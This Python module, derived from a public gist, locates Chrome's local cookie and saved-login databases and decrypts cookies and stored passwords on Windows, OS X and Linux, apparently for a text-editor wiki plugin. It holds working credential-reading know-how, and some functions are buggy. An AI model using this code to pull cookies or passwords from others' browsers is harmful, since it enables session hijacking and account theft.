#The MIT License (MIT)

# Copyright (c) 2012 Jordan Wright <jordan-wright.github.io>
# Copyright (c) 2014 Rasmus Sorensen <scholer.github.io> rasmusscholer@gmail.com

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.

"""
https://gist.github.com/jordan-wright/5770442

Get chrome cookies from chrome's database on Windows.

Platform-specific implementations:
* Windows:  Uses win32crypt module, or the pseudo-equivalent decrypt() from wincrypt_understudy.py
* OS X:     Uses keyring module. The pure-python module is packaged as keyring.zip and added to the path.
* Linux:    Uses AES decryption or the stand-in functions from adhoc_crypto

OS X and Linux implementations are based on code from pyCookieCheat.py.


== Current issues to get chrome extract working: ==

General issues:
* sqlite3... -- Done for windows, should be equally simple to do for OS X...
* Windows encryption returns byte-strings, while on OS X it returns unicode.?


PBKDF2 key issue:
 - Tried to use PyCrypto's Crypto.Protocol.KDF. But, requires compilatio of strxor.c which goes in Util/strxor_c

Sqlite3 progress:
# sqlite subfolder is in Sublime Text 3/python3.3.zip/sqlite3/ as binary .pyo files.
# It works if you extract python3.3.zip, but not really: it does not have the connect() and friends
    which are provided by the compiled layer. So, not when it is as a compiled path.
# Maybe I have to package all platform-specific (Windows, OS X, Linux) x (32 bit, 64 bit)
    and import them depending on the current ST platform... sigh..
# ALTERNATIVELY: Run sqlite3 via external python (invoking local script or just a single command string)
# OK, got it to work, see sqlite3_adhoc


Solved issues:
* Windows AES decryption - using stand-in decrypt from wincrypt_understudy.py
* sqlite3 - solved by using compiled standard lib files with platform-dependent import.
* PBKDF2 replacement in adhoc_crypto as stand-in for the equivalent in Crypto.Protocol.KDF
    -- but doesn't work. Requires compilatio of strxor.c which goes in Util/strxor_c
    -- Used dlitz's (creator of PyCrypto) pure-python PBKDF2 from github.com/dlitz/python-pbkdf2
    -- Creating a custom adaptor function, but that's easy.
* OSX/Linux AES Crypto replacement/stand-in. -- Fixed using replacement module from TLS-Lite package.


== Changes: ==

2015-Jul-28:
"The database schema for Chrome cookies has recently been changed to utilize partial indexes,
which are supported on SQLite 3.8.0 and higher (https://www.sqlite.org/partialindex.html)."
http://stackoverflow.com/questions/31652864/sqlite3-error-malformed-database-schema-is-transient-near-where-syntax-e
The current library version (shipped with python 3.3.5) is:
    sqlite3 sqlite version: 3.7.12


"""

from __future__ import print_function
import os
import sys
import warnings
import tempfile
import shutil

cookieshopdir = os.path.dirname(os.path.abspath(os.path.realpath(__file__)))
libdir = os.path.dirname(cookieshopdir)

try:
    from urllib.parse import urlparse
except ImportError:
    from urlparse import urlparse
try:
    # keyring is used to prompt for user password required to decrypt on OS X
    import keyring  # Not available in Sublime Text...
except ImportError:
    sys.path.append(os.path.join(libdir, 'keyring.zip'))
    try:
        import keyring
    except ImportError:
        warnings.warn("Could not import keyring module.")
        keyring = None # On OS X, python should be system wide; on Windows we don't need keyring.

try:
    import sqlite3
except ImportError:
    try:
        from .sqlite3_adhoc import sqlite3
        print("chrome_extract: Using sqlite3_adhoc replacement module...")
    except ImportError as exc:
        print("ImportError while importing sqlite3 stand-in module:", exc)
        raise exc
print("sqlite3.sqlite_version:", sqlite3.sqlite_version)
print("sqlite3.version:", sqlite3.version)

try:
    import apsw
except ImportError:
    # https://github.com/ghaering/pysqlite  (https://docs.python.org/2/library/sqlite3.html) -- is C code...
    # pypi.python.org/pypi/PyDbLite , www.pydblite.net/en/index.html -- pure python, but a tad different from sqlite3.
    # from pydblite import sqlite # pydblite relies on built-in sqlite3 or pysqlite2...
    try:
        from .sqlite3_adhoc import apsw
        print("chrome_extract: Using sqlite3_adhoc apsw replacement module...")
    except ImportError as exc:
        print("ImportError while importing sqlite3 apsw stand-in module:", exc)
        #raise exc # Not fatal...
        apsw = None
print("apsw module:", apsw)
if apsw:
    print("apsw sqlite version:", apsw.sqlitelibversion())
    print("apsw version:", apsw.apswversion())


try:
    from Crypto.Cipher import AES
except ImportError:
    #warnings.warn("Could not import Crypto.Cipher AES module.")
    """
    PyCrypto (Crypto) alternatives: (https://github.com/dlitz/pycrypto)

    pyOCB (github.com/kravietz/pyOCB) - could be used, but Chrome encrypts as CBC, not OCB.
    AES-Python (https://github.com/bozhu/AES-Python)
    --- another pure-python implementation. However, does not have an easy-to-use interface.
    --- Not sure what modes are supported, seems quite ad-hoc. Like... "hey, let me try to implement AES..."
    --- "only for AES-128"
    ---
    PythonAES, https://github.com/caller9/pythonaes
    - another pure-python implementation.
    TLSlite (https://github.com/trevp/tlslite)
    --- has pure-python AES in https://github.com/trevp/tlslite/blob/master/tlslite/utils/python_aes.py
    Cryptography package (https://github.com/pyca/cryptography)
    -- Seems really, really nice, with the goal to deliver "idiot proof" secure cryptography
    -- But, also requires compilation, i.e. not pure-python plugin.

    Oh, I tried to use PyCrypto, but is seems it is also not python3.x compatible...? (I get an error...)
    But pypi.python.org/pypi/pycrypto states that it is compatible with python 3.3 ?
    Edit: PyCrypto's setup is expected to run 2to3 on the code.
    """
    # This seems to be a pretty good stand-in for PyCrypto's AES Cipher:
    from .tlslite_utils import python_aes as AES
    # tlslite_utils AES only uses CBC_MODE, so doesn't really matter, but set it anyway:
    AES.MODE_CBC = 2

try:
    from Crypto.Protocol.KDF import PBKDF2
except ImportError:
    #warnings.warn("Could not import PBKDF2 function from Crypto.Protocol.KDF module.")
    """

    == The PBKDF key issue: ==
    Maybe just use the Crypto.Protocol.KDF module, that is a pure-python module ?
    -- Nope, Requires compilatio of strxor.c which goes in Util/strxor_c

    dlitz (creator of PyCrypto) has PBKDF2 has pure-python module: github.com/dlitz/python-pbkdf2
        >>> from pbkdf2 import PBKDF2 as PBKDF2_cls
    PBKDF2 from pbkdf2 is different from that from Crypto.Protocol.KDF:
    Crypto.Protocol.KDF.PBKDF2() is a function:
        def PBKDF2(password, salt, dkLen=16, count=1000, prf=None):
           keybuf = PBKDF2(password, salt, count)
           return keybuf.read(dkLen)
    This is used as:
        >>> key = PBKDF2(my_pass, salt, length, iterations)
        # Returns byte string
    While pbkdf2.PBKDF2 is an object-derived class, with:
        def __init__(self, passphrase, salt, iterations=1000, digestmodule=SHA1, macmodule=HMAC):
            ...
    And is used as:
        >>> key = PBKDF2("password", "ATHENA.MIT.EDUraeburn_salt", 1200).read(32)
        or, to read as hex:
        >>> key = PBKDF2(my_pass, salt, iterations).hexread(length)
        # and returns

    """
    #from adhoc_crypto.KDF import PBKDF2
    try:
        from .pbkdf2 import PBKDF2 as _PBKDF2
    except ImportError:
        from pbkdf2 import PBKDF2 as _PBKDF2
    def PBKDF2(my_pass, salt, length, iterations):
        return _PBKDF2(my_pass, salt, iterations).read(length)

# Windows decryption.
if sys.platform == 'win32':
    try:
        import win32crypt
    except ImportError:
        win32crypt = None
        from .wincrypt_understudy import decrypt as win_decrypt  # Seems good enough...



## ENCRYPTION CONSTANTS ##

crypt_iv = b' ' * 16



## PATHS: ##

# If running Chrome on OSX
if sys.platform == 'darwin':
    cookies_dbpath = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Cookies')
    logins_dbpath = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data')
# If running Chromium on Linux
elif sys.platform == 'linux':
    cookies_dbpath = os.path.expanduser('~/.config/chromium/Default/Cookies')
    logins_dbpath = os.path.expanduser('~/.config/chromium/Default/Login Data')
elif sys.platform == 'win32':
    chrome_appdata = os.path.abspath(os.path.join(os.getenv("APPDATA"), r"..\Local\Google\Chrome\User Data\Default"))
    cookies_dbpath = os.path.join(chrome_appdata, "Cookies")
    logins_dbpath = os.path.join(chrome_appdata, "Login Data")
else:
    warnings.warn("This module only supports Windows, OS X and Linux.")


# Queries:
logins_query = 'SELECT action_url, username_value, password_value FROM logins'

def cookie_query_for_domain(url):
    """
    Create sql query to find cookies for a particular domain given a url of the format
        https://lab.wyss.harvard.edu/shih/RasmusProjects
    """
    # Part of the domain name that will help the sqlite3 query pick it from the Chrome cookies
    domain = urlparse(url).netloc
    # If url is just a domain, e.g. lab.wyss.harvard.edu, then urlparse doesn't work:
    if not domain:
        domain = url.split('/')[0]
        print("Given URL doesn't seem to have a schema. Parsing domain as '%s' instead." % domain)
    sql = 'select name, value, encrypted_value from cookies where host_key like "%{}%"'.format(domain)
    return sql


##  DECRYPTION ##
def make_chrome_cryptkey():
    """ Make a platform-dependent encryption (decryption) key for Chrome. """
    salt = b'saltysalt'
    length = 16

    if sys.platform == 'win32':
        # Windows doesn't really use an encryption key...
        return None

    # If running Chrome on OSX
    if sys.platform == 'darwin':
        my_pass = keyring.get_password('Chrome Safe Storage', 'Chrome')
        my_pass = my_pass.encode('utf8') # Ensure bytearray
        iterations = 1003
    # If running Chromium on Linux
    elif sys.platform == 'linux':
        my_pass = 'peanuts'.encode('utf8')
        iterations = 1
    else:
        raise Exception("This script only works on OSX or Linux.")

    # Generate key from values above
    # All inputs should be bytearrays or integers.
    key = PBKDF2(my_pass, salt, length, iterations)
    return key


def chrome_decrypt(encrypted_value, key=None):
    """
    Decrypt value using Chrome's platform-dependent symmetric encryption scheme using key.
    encrypted_value should be a byte string, otherwise you'll probably get a
    TypeError: expected an object with a buffer interface
    """
    # For windows, chrome just uses
    if sys.platform == 'win32':
        # CryptUnprotectData returns a two-string tuple. Not sure what the first value is...
        # This is more obfucation, so might change at some point...
        if win32crypt:
            _, decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)
        else:
            # Understudy:
            decrypted = win_decrypt(encrypted_value)
        return decrypted.decode('utf-8')

    # Encrypted cookies should be prefixed with 'v10' according to the Chromium code. Strip it off.
    # (Only for OSX/Linux, c.f. <chromium code base>//src/components/os_crypt/os_crypt_mac.mm)
    encryption_scheme_version, encrypted_value = encrypted_value[:3], encrypted_value[3:]

    # Strip padding by taking off number indicated by padding
    # eg if last is '\x0e' then ord('\x0e') == 14, so take off 14.
    # You'll need to change this function to use ord() for python2.
    def clean(x):
        """ Remove padding and decode to utf8 """
        return x[:-x[-1]].decode('utf8')

    cipher = AES.new(key, AES.MODE_CBC, IV=crypt_iv)
    # Debugging note: cipher is state-full.
    # Every time you invoke cipher.encrypt(...) it will return something different.
    # Same goes for cipher.decrypt(...).
    # That also means that you cannot use the same cipher to first encrypt and
    # then decrypt, unless you have the same number of bytes before.
    decrypted = cipher.decrypt(encrypted_value)
    return clean(decrypted)


def temp_database_copy(dbpath):
    """ Make a copy of dppath in a temporary directory. """
    # TemporaryDirectory only for python 3.2+ :
    #with tempfile.TemporaryDirectory() as tempdir:
    try:
        tempdir = tempfile.TemporaryDirectory()
    except AttributeError:
        tempdir = tempfile.mkdtemp()
    tempdbpath = os.path.join(tempdir.name, os.path.basename(dbpath))
    print("Copying db to temp file:", tempdbpath)
    shutil.copy(dbpath, tempdbpath)
    return (tempdir, tempdbpath)

def clear_temp_database(tempdir, tempdbpath):
    """ Remove temporary database and directory. """
    try:
        os.remove(tempdbpath)
        try:
            # If tempdir is a tempfile.TemporaryDirectory():
            tempdir.cleanup()
        except AttributeError:
            # If tempdir is a normal tempfile.mkdtemp()
            shutil.rmtree(tempdir)
    except WindowsError as e:
        print(e)


def query_db(dbpath, query):
    """
    Connects to database in dbpath, queries with query
    and returns all matching rows as a list by calling fetchall()
    (I believe the returned values are byte strings, at least in some cases...)
    Example usage:
        from Mediawiker.lib.
        query_db(r'C:/Users/scholer/AppData/Local/Google/Chrome/User Data/Default/Cookies',
                 'select name, value, encrypted_value from cookies where host_key like "%lab.wyss.harvard.edu%"')
    """
    print("Connecting to database:", dbpath)
    # Connect to the Database
    with sqlite3.connect(dbpath) as conn:
        print("Database opened, executing query '%s'" % query)
        cursor = conn.execute(query)
        print("Query executed, fetching results...")
        res = cursor.fetchall()
    return res


def query_db_apsw(dbpath, query):
    """
    Same as query_db(...) but using APSW instead of the native sqlite3.
    """
    print("Connecting to database:", dbpath)
    with apsw.Connection(dbpath) as conn:
        print("Database opened, executing query '%s'" % query)
        # apsw.Connection does not have the short-hand "execute" method that native sqlite3 has...
        cursor = conn.cursor()
        cursor.execute(query)   # This will raise error if database is locked...
        print("Query executed, fetching results...")
        res = cursor.fetchall()
        del cursor   # Make really, really sure that connection is closed
    #conn.close() # before trying to remove database file.
    return res


def query_db_fallback_wrapper(dbpath, query):
    """
    Connect to database file in dbpath, issue <query> and return all results from fetchall().
    This wrapper function will try the query, and, if it fails, make a temporary copy of
    the database, which will then be queried.
    """
    print("Trying to connect to database:", dbpath)
    if apsw:
        print("Using APSW to query database...")
        query_method = query_db_apsw
        busy_exceptions = apsw.BusyError
    else:
        print("Using native sqlite3 to query database...")
        query_method = query_db
        busy_exceptions = sqlite3.OperationalError
    try:
        res = query_method(dbpath, query)
    except busy_exceptions:
        print("- Could not connect to database: %s" % dbpath)
        print("- Database might be locked, e.g. if chrome is currently running.")
        print("- Will create a copy and try again...")
        tempdir, tempdbpath = temp_database_copy(dbpath)
        print("Re-trying connecting to temp copy database:", tempdbpath)
        res = query_method(tempdbpath, query)
        clear_temp_database(tempdir, tempdbpath)
    print("- %s rows retrieved!" % len(res))

    return res



def query_cookies_db(query):
    """ Convenience function... """
    print("Querying chrome cookie database...")
    return query_db_fallback_wrapper(cookies_dbpath, query)


def get_chrome_logins():
    """
    Returns list of dict with site, username, password.
    """
    rows = query_db(logins_dbpath, logins_query)
    rowdicts = [{'site': result[0], 'username': result[1], 'password': win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]}]
    return rowdicts


def print_logins():
    rows = query_db(logins_dbpath, logins_query)
    for result in rows:
        # Decrypt the Password
        # CryptUnprotectData(optionalEntropy, reserved , promptStruct , flags )
        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        if password:
            print("---")
            print("Site: %s\nUsername: %s\nPass: %s" % (result[0], result[1], len(password)))



def get_chrome_cookies(url, filter=None):
    """
    Returns all chrome's cookies for url (or domain) <url>,
    as a dict {cookie_name : value},
    making sure that value is decrypted (if stored as encrypted).
    Optional arg <filter>, if given, is a function that filters the result,
    including only cookies where filter(cookie_name) is True.
    Usage:
        >>> get_chrome_cookies('lab.wyss.harvard.edu', filter=lambda k: 'session_id' in k)
    """
    key = make_chrome_cryptkey() # Encryption key (is None for Windows)
    query = cookie_query_for_domain(url)
    # SQL query returns rows with: name, value, encrypted_value
    # Gets the full results list and closes db connection
    # Returns a list of key, value, encrypted_value, where key is cookie name.
    cookie_entries = query_cookies_db(query)
    if filter:
        print("Filtering...")
        cookie_entries = [(k, v, ev) for k, v, ev in cookie_entries if filter(k)]
    print("Decrypting cookies:")
    # Make sure *all* inputs are bytearrays, including key:
    cookies_dict = {k: chrome_decrypt(ev, key=key) if ev else v for k, v, ev in cookie_entries}
    return cookies_dict



def main():
    if sys.argv:
        get_chrome_cookies(sys.argv[0])
    else:
        print_logins()


if __name__ == '__main__':
    main()
